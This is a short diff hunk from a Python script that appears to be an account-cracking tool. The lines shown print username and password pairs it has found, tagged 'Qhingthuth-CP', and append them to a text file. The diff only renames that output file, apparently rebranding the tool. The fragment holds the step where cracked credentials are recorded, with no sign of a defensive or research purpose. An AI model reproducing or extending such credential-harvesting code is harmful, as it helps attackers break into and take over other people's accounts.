@@ -242,7 +242,7 @@ class __xxx__:
                         print('\r%s [Qhingthuth-CP] %s | %s ' % (M, user, pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('MAHADI_CP.txt' , 'a').write('%s\n' % wrt)
+                        open('qhingtuth_CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
